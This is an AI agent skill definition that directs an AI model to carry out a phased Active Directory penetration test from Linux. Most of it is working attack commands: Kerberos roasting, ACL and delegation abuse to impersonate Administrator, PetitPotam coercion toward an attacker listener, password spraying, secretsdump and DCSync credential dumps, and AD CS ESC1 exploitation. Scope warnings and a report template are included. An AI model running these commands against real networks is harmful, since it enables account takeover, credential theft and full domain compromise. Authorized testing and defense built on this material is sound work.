---
name: ad-recon
description: Full Active Directory attack-path enumeration and exploitation methodology on Linux: enumerates domain objects with LDAP/SMB/RPC, builds BloodHound attack graphs, hunts Kerberos weaknesses (AS-REP roasting, Kerberoasting), abuses ACLs and delegation, harvests credentials, and detects AD CS (ESC1-8) and persistence indicators, with every finding tagged to MITRE ATT&CK. Produces a structured Markdown report. Trigger when the user provides domain controller access (unauthenticated or with credentials) and asks for AD enumeration, privilege escalation path analysis, or an internal/AD pentest.
license: MIT
metadata:
  version: "1.0.0"
  author: community
  tags: ["active-directory", "ad", "kerberos", "bloodhound", "internal-pentest", "privilege-escalation", "lateral-movement"]
---

# AD Recon: Active Directory Attack Path Enumeration

A structured methodology for enumerating and analyzing Active Directory environments from Linux, using the standard open-source AD tooling (Impacket, NetExec, BloodHound, Certipy). Goes from zero credentials to a ranked list of privilege-escalation paths to Domain Admin.

When this skill is active, follow every phase in order. Do not skip phases: even with zero credentials, Phase 0 alone surfaces valid usernames that feed every later phase. Run each command, collect output, and build the final Markdown report incrementally. Always operate within the scope and rules of engagement given by the user: AD attack tooling is intrusive and some techniques (password spraying, DCSync, ticket forging) can lock out accounts or trip EDR/SIEM alerts.

---

## Pre-flight: Tool Check

Before starting, verify required tools are available:

```bash
for tool in nxc netexec crackmapexec impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump impacket-psexec ldapsearch kerbrute bloodhound-python certipy certipy-ad smbclient rpcclient enum4linux-ng dig; do
  command -v $tool && echo "$tool OK" || echo "$tool MISSING"
done
```

`nxc` (NetExec) has replaced CrackMapExec upstream: use `nxc` if present, fall back to `crackmapexec`. Install missing tools:

```bash
# Impacket suite
pipx install impacket

# NetExec
pipx install netexec

# BloodHound ingestor
pipx install bloodhound

# Certipy (AD CS enumeration/abuse)
pipx install certipy-ad

# kerbrute (Kerberos pre-auth user enumeration)
go install github.com/ropnop/kerbrute@latest

# enum4linux-ng
git clone https://github.com/cddmp/enum4linux-ng /opt/enum4linux-ng
```

Inform the user of any tools that could not be installed and note which phases will be skipped or degraded.

---

## Setup: Target Variables

```bash
DC_IP="<domain controller IP>"
DOMAIN="<domain.local>"        # FQDN, from Phase 0 if unknown at start
USER=""                        # username, blank if fully unauthenticated
PASS=""                        # password or NTLM hash (leave blank if none)
HASH=""                        # NTLM hash for pass-the-hash, format LM:NT or :NT
WORKDIR="/tmp/ad-recon/$DOMAIN"
mkdir -p "$WORKDIR"/{loot,bloodhound,tickets,secrets}

echo "Target DC: $DC_IP | Domain: $DOMAIN | Auth: ${USER:-anonymous}"
```

Use `$DC_IP`, `$DOMAIN`, `$USER`, `$PASS`, `$HASH`, `$WORKDIR` as variables throughout all subsequent phases. Update them as credentials are obtained in later phases, since this skill is iterative: each phase's output can unlock the next.

---

## Phase 0: Unauthenticated / Anonymous Enumeration

Establish domain identity and check for null-session and anonymous misconfigurations before any credentials exist.

### 0.1 Domain identity via DNS / SMB / LDAP

```bash
nmap -p88,389,445,464,636,3268 -sV "$DC_IP" -oN "$WORKDIR/loot/nmap-dc.txt"

# Domain name from SMB
nxc smb "$DC_IP"

# Domain name from LDAP anonymous bind
ldapsearch -x -H "ldap://$DC_IP" -s base namingcontexts 2>/dev/null
```

Record: NetBIOS domain name, FQDN, DC hostname, OS build (from the SMB banner, flags EOL Windows Server versions).

### 0.2 Null session / anonymous LDAP bind

```bash
nxc smb "$DC_IP" -u '' -p '' --shares
nxc smb "$DC_IP" -u 'a' -p '' --shares   # guest fallback

enum4linux-ng -A "$DC_IP" -oY "$WORKDIR/loot/enum4linux.yaml"

ldapsearch -x -H "ldap://$DC_IP" -b "DC=${DOMAIN//./,DC=}" '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName
```

Flag as critical: anonymous LDAP bind returning user objects, null-session SMB access, or any world-readable share.

### 0.3 Username enumeration (no credentials required)

```bash
# Kerberos pre-auth enumeration: does not touch event log 4625 the way SMB login attempts do
kerbrute userenum -d "$DOMAIN" --dc "$DC_IP" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o "$WORKDIR/loot/valid-users.txt"

# RID cycling via rpcclient (if null session works)
rpcclient -U "" -N "$DC_IP" -c "lookupnames administrator" 2>/dev/null
for rid in $(seq 500 1200); do
  rpcclient -U "" -N "$DC_IP" -c "lookupsids S-1-5-21-<domain-sid>-$rid"
done 2>/dev/null | grep -v "SID does not"
```

Every valid username found here feeds Phase 3 (AS-REP roasting works pre-auth, no password required).

### 0.4 Password policy & lockout threshold

```bash
nxc smb "$DC_IP" -u '' -p '' --pass-pol
```

Note lockout threshold before attempting any password spray in Phase 1: never exceed `threshold - 1` guesses per account per observation window.

### 0.5 Shares open to Everyone/Guest

```bash
nxc smb "$DC_IP" -u '' -p '' --shares
smbclient -N -L "//$DC_IP/"
```

Flag: SYSVOL/NETLOGON readable is normal; anything else world-readable (especially with scripts, backups, or `.xml`/`.ini` files) is high-value. Check Phase 5.2 for GPP passwords.

---

## Phase 1: Authenticated Enumeration

Once any valid credential is obtained (from Phase 0, a spray, or user-supplied), pivot to full authenticated enumeration.

### 1.1 Validate credentials and check admin access

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" 
nxc smb "$DC_IP" -u "$USER" -p "$PASS" --local-auth   # local admin check across other hosts if a host list exists
```

`(Pwn3d!)` in NetExec output means local admin on that host: jump to Phase 5 for that host immediately.

### 1.2 Full LDAP dump

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --bloodhound -c All --dns-server "$DC_IP" 2>&1 | tee "$WORKDIR/loot/ldap-dump.txt"

# Alternative: ldapdomaindump for a browsable HTML/JSON dump
pipx run ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" "$DC_IP" -o "$WORKDIR/loot/ldapdomaindump"
```

### 1.3 Trusts and forest structure

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M enum_trusts 2>/dev/null
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "DC=${DOMAIN//./,DC=}" '(objectClass=trustedDomain)' 2>/dev/null
```

Record every trust direction (inbound/outbound) and whether it is transitive: cross-forest trusts with SID history enabled are a known escalation path.

### 1.4 Domain computers, OUs, and GPOs

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M get-desc-users 2>/dev/null
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "DC=${DOMAIN//./,DC=}" '(objectClass=computer)' dNSHostName operatingSystem 2>/dev/null
```

Flag EOL operating systems (`Windows Server 2008`, `Windows 7`) and any computer object with `userAccountControl` indicating unconstrained delegation (see 4.2).

---

## Phase 2: BloodHound Collection & Attack Path Analysis

BloodHound turns raw LDAP/SMB enumeration into graph queries for shortest paths to Domain Admin. This is the single highest-leverage phase.

### 2.1 Collect

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c All --zip -o "$WORKDIR/bloodhound"
# Or, from a domain-joined Windows host: SharpHound.exe -c All
```

### 2.2 Ingest and analyze

Load the zip into BloodHound (Community Edition/Neo4j backend) and run the built-in queries first:
- Shortest Paths to Domain Admins
- Shortest Paths from Kerberoastable Users
- Shortest Paths from Owned Objects (mark any compromised principal as "owned" first)
- Find Principals with DCSync Rights
- Find Computers with Unconstrained Delegation

### 2.3 Custom Cypher for common escalation primitives

```cypher
// Any path from current principal to Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN p

// Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN u.name, length(p)

// Dangerous ACEs held by non-privileged principals
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword]->(m)
WHERE NOT n.name CONTAINS "DOMAIN ADMINS"
RETURN n.name, type(r), m.name
```

Every path BloodHound surfaces should be independently verified in Phases 3-6 before being reported as exploitable: BloodHound shows what is *possible*, not what actually works (e.g. it doesn't check LAPS randomization status or Protected Users membership).

---

## Phase 3: Kerberos Attacks

### 3.1 AS-REP Roasting (no credentials required)

Targets accounts with `Do not require Kerberos preauthentication` set: works against the username list from Phase 0.3 with zero valid passwords.

```bash
impacket-GetNPUsers "$DOMAIN/" -usersfile "$WORKDIR/loot/valid-users.txt" -no-pass -format hashcat -outputfile "$WORKDIR/tickets/asrep.hash"
hashcat -m 18200 "$WORKDIR/tickets/asrep.hash" /usr/share/wordlists/rockyou.txt
```

### 3.2 Kerberoasting (requires any valid domain credential)

Targets service accounts (`servicePrincipalName` set): their Kerberos service ticket is encrypted with the account's NTLM hash and crackable offline.

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile "$WORKDIR/tickets/spn.hash"
hashcat -m 13100 "$WORKDIR/tickets/spn.hash" /usr/share/wordlists/rockyou.txt
```

Flag any cracked account that is a member of a privileged group: Kerberoasting a `DOMAIN ADMINS` service account is a direct path to full compromise.

### 3.3 Targeted Kerberoasting via writable SPN (self-service)

If the current user has `GenericWrite`/`GenericAll` on another account (from Phase 2.3), set an SPN on it and roast it even if it wasn't a service account originally:

```bash
impacket-addspn.py -u "$DOMAIN\\$USER" -p "$PASS" -s "http/fake" "$DOMAIN\\TARGET_USER" -dc-ip "$DC_IP"
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request-user TARGET_USER
```

### 3.4 Timeroasting (no credentials required, rarely patched)

```bash
python3 timeroast.py "$DC_IP" > "$WORKDIR/tickets/timeroast.hash"
hashcat -m 31300 "$WORKDIR/tickets/timeroast.hash" /usr/share/wordlists/rockyou.txt
```

---

## Phase 4: ACL & Delegation Abuse

### 4.1 Dangerous ACE enumeration

Cross-reference the BloodHound Cypher output from 2.3. For each dangerous ACE the current principal (or an owned principal) holds, map to the specific abuse primitive:

| ACE / Right | Abuse |
|---|---|
| `GenericAll` on user | Reset password directly, or shadow credentials (see 4.4) |
| `GenericAll` / `GenericWrite` on group | Add self as member |
| `ForceChangePassword` | Reset target's password without knowing the old one |
| `WriteDacl` | Grant self `GenericAll`, then abuse as above |
| `WriteOwner` | Take ownership, then grant self `WriteDacl` |
| `AddMember` on group | Add self directly, no password reset needed |
| `WriteSPN` (self) | Set own SPN to become Kerberoastable by an attacker, or leverage for targeted roasting of others |

```bash
# Example: ForceChangePassword abuse
impacket-changepasswd "$DOMAIN/$USER:$PASS"@"$DC_IP" -newpass 'NewP@ssw0rd!' -altuser TARGET_USER -altpass "$PASS"
```

### 4.2 Unconstrained delegation

Computers with `TRUSTED_FOR_DELEGATION` cache TGTs of any user that authenticates to them. If you have admin on such a host, coerce a DC/high-value account to authenticate to it and extract the TGT.

```bash
# Find unconstrained-delegation computers (also visible in BloodHound)
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M unconstrained-delegation 2>/dev/null

# Coerce authentication (PetitPotam / PrinterBug) then capture TGT with Rubeus/mimikatz on the compromised box, or:
python3 PetitPotam.py -u "$USER" -p "$PASS" "<attacker-listener-ip>" "$DC_IP"
```

### 4.3 Constrained delegation & RBCD

```bash
# Constrained delegation targets
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M constrained-delegation 2>/dev/null

# S4U2Self/S4U2Proxy abuse of constrained delegation
impacket-getST -spn "cifs/target.$DOMAIN" -impersonate Administrator "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP"

# Resource-Based Constrained Delegation: if you have GenericWrite on a computer object, set msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-from "ATTACKER-CONTROLLED-COMPUTER$" -delegate-to "TARGET-COMPUTER$" -action write "$DOMAIN/$USER:$PASS"
impacket-getST -spn "cifs/target-computer.$DOMAIN" -impersonate Administrator "$DOMAIN/attacker-computer\$:$PASS" -dc-ip "$DC_IP"
```

### 4.4 Shadow credentials (msDS-KeyCredentialLink)

If `GenericAll`/`GenericWrite` is held on a user or computer object, add a key credential and authenticate as it via PKINIT: no password change, no lockout risk.

```bash
certipy-ad shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account TARGET_USER -dc-ip "$DC_IP"
```

---

## Phase 5: Credential Harvesting & Lateral Movement

### 5.1 Local admin → secretsdump (SAM, LSA secrets, cached creds)

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS"@"<target-host>" -outputfile "$WORKDIR/secrets/dump"
```

### 5.2 GPP / SYSVOL cpassword extraction

Legacy Group Policy Preferences store passwords AES-encrypted with a published Microsoft key.

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password 2>/dev/null
smbclient -U "$USER%$PASS" "//$DC_IP/SYSVOL" -c 'recurse ON; prompt OFF; mget *.xml'
grep -ril cpassword "$WORKDIR/loot/" 2>/dev/null
```

### 5.3 LAPS readers

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M laps 2>/dev/null
```

Flag any non-privileged principal with `ms-Mcs-AdmPwd` (or `msLAPS-Password` for Windows LAPS) read rights.

### 5.4 DCSync

If the current principal has `Replicating Directory Changes` + `Replicating Directory Changes All` (directly or via BloodHound path), dump every domain credential without touching LSASS.

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS"@"$DC_IP" -just-dc -outputfile "$WORKDIR/secrets/dcsync"
```

This is equivalent to full domain compromise: treat any principal with DCSync rights as Domain Admin-equivalent in the report, regardless of its actual group membership.

### 5.5 Password spraying (respecting Phase 0.4 lockout threshold)

```bash
nxc smb "$DC_IP" -u "$WORKDIR/loot/valid-users.txt" -p 'Summer2026!' --continue-on-success
```

Only spray with explicit user authorization and stay under the lockout threshold minus a safety margin.

---

## Phase 6: AD CS (Certificate Services) Abuse

If an Enterprise CA is present, enumerate certificate templates for the ESC1-ESC8 misconfiguration classes.

```bash
certipy-ad find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout
```

| Technique | Misconfiguration | Impact |
|---|---|---|
| ESC1 | Template allows requester-supplied SAN + client auth EKU | Request cert as any user, including Domain Admin |
| ESC2 | Template has "Any Purpose" or no EKU | Cert usable for any auth purpose |
| ESC3 | Enrollment agent template misconfigured | Enroll on behalf of another user |
| ESC4 | Weak ACL on certificate template object | Reconfigure template to ESC1-vulnerable, then abuse |
| ESC6 | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | SAN injection on any template |
| ESC7 | Weak ACL on CA itself | Grant self `Manage CA`/`Manage Certificates`, issue arbitrary certs |
| ESC8 | HTTP enrollment enabled, no channel binding | NTLM relay to CA web enrollment for cert issuance |

```bash
# ESC1 exploitation
certipy-ad req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN

# Authenticate with the issued certificate to get a TGT / NT hash
certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"
```

---

## Phase 7: Persistence Indicator Detection

This is a *detection* phase: check for signs an attacker (or a red team engagement's own prior activity) has already established persistence, and report it as a finding rather than executing it against a live environment without explicit authorization.

```bash
# AdminSDHolder tampering: non-default ACEs on CN=AdminSDHolder
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "CN=AdminSDHolder,CN=System,DC=${DOMAIN//./,DC=}" 2>/dev/null

# DSRM account with a set password / logon allowed
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M dsrm 2>/dev/null

# SID History on any account outside a migration window
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M sidhistory 2>/dev/null

# krbtgt password age (golden ticket indicator: should rotate regularly, never twice-in-a-row unrotated after a known compromise)
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --kdcHost "$DC_IP" 2>/dev/null
```

Flag: any account with SID History pointing to `DOMAIN ADMINS`/`ENTERPRISE ADMINS` outside a documented migration, DSRM logon behavior enabled, or unexplained ACEs on `AdminSDHolder`.

---

## Phase 8: Structured Markdown Report Output

Produce the following report. Fill every section with findings from Phases 0-7. Do not omit empty sections: write "None found" if a section has no findings.

```markdown
# AD Recon Report

**Domain:** `<domain.local>` (NetBIOS: `<DOMAIN>`)
**Domain Controller:** `<hostname>` (`<IP>`), `<OS build>`
**Starting access:** `<unauthenticated / USER@DOMAIN>`
**Ending access:** `<highest privilege obtained>`
**Analysis date:** `<YYYY-MM-DD>`

---

## Risk Summary

| Category | Findings | Highest Severity |
|---|---|---|
| Kerberos Weaknesses | N | Critical / High / Medium / Low |
| ACL / Delegation Abuse | N | ... |
| Credential Exposure | N | ... |
| AD CS Misconfiguration | N | ... |
| Persistence Indicators | N | ... |
| Trust / Forest Issues | N | ... |
| **Total** | **N** | **Critical / High / ...** |

**Overall Risk Rating:** [Critical / High / Medium / Low]
**Path to Domain Admin:** [Yes, N steps / No path found in scope]

---

## 1. Domain Overview

| Property | Value |
|---|---|
| Forest / Domain | |
| Domain Controllers | |
| Functional level | |
| Trusts | |
| EOL hosts detected | |

---

## 2. Kerberos Findings

### 2.1 AS-REP Roastable Accounts

| Account | Cracked | Group Membership | Severity |
|---|---|---|---|
| svc_backup | Yes, `Summer2025!` | Domain Users | High |

### 2.2 Kerberoastable Accounts

| Account | SPN | Cracked | Group Membership | Severity |
|---|---|---|---|---|

---

## 3. ACL & Delegation Findings

| # | Principal | Right | Target | Abuse Path | Severity |
|---|---|---|---|---|---|
| 1 | user1 | GenericAll | DOMAIN ADMINS group | Add self to group | Critical |

---

## 4. Credential Exposure

| Type | Source | Value (truncated) | Severity |
|---|---|---|---|
| GPP cpassword | SYSVOL/Policies/.../Groups.xml | P@ss****** | Critical |

---

## 5. AD CS Findings

| # | Template / CA | ESC Class | Exploitable By | Severity |
|---|---|---|---|---|

---

## 6. Persistence Indicators

[Findings or "None found"]

---

## 7. MITRE ATT&CK Mapping

| # | Finding | ATT&CK Technique | Tactic | Severity |
|---|---|---|---|---|
| 1 | Kerberoastable svc_sql with DA group membership | T1558.003 | Credential Access | Critical |
| 2 | GenericAll on DOMAIN ADMINS held by user1 | T1098 / T1484 | Persistence / Priv Esc | Critical |

### Detailed Findings

For each finding above, provide:

**[#N] Title**
- **Location:** object DN / host / file
- **Evidence:** command output or grep result
- **Impact:** what an attacker can do
- **ATT&CK:** T-number and tactic
- **Remediation:** specific fix guidance (reference `references/attck-ad-mapping.md`)

---

## 8. Attack Path Summary

A concise paragraph summarizing the shortest verified path from starting access to Domain Admin (or the reason no path was found), and recommended first actions for remediation.

**Top 3 findings to act on:**
1. [Most critical]
2. [Second]
3. [Third]

**Suggested next steps:**
- Immediate credential rotation required: [any exposed passwords/hashes]
- ACL remediation required: [specific dangerous ACEs to remove]
- Further testing recommended: [trust boundaries, AD CS re-enumeration after remediation]
```

---

## Reference Files

- `references/ad-attack-patterns.md`: Full command/pattern reference for each attack primitive (Kerberoasting, ACL abuse, delegation, AD CS) with severity ratings and tool syntax
- `references/attck-ad-mapping.md`: MITRE ATT&CK technique reference for AD attack classes with remediation guidance
